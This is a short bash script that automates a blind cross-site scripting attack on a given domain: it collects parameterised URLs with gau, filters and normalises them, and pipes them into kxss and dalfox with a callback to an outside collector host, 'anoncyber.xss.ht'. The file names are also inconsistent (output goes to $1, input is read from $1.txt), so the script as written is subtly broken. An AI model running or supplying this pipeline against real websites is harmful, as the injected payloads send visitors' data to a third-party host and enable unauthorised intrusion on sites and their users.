#!/bin/bash

# Clean Gau Data

gau $1 | \
grep "=" | \
egrep -iv ".(jpg|jpeg|gif|css|tif|tiff|png|ttf|woff|woff2|ico|pdf|svg|txt|js)" | \
qsreplace -a | \
tee $1

cat $1

#  Blind XSS

BLIND="https://anoncyber.xss.ht"
cat $1.txt | kxss | grep -Eo "(http|https)://[a-zA-Z0-9./?=_-]*" | \
dalfox file $1 pipe -b $BLIND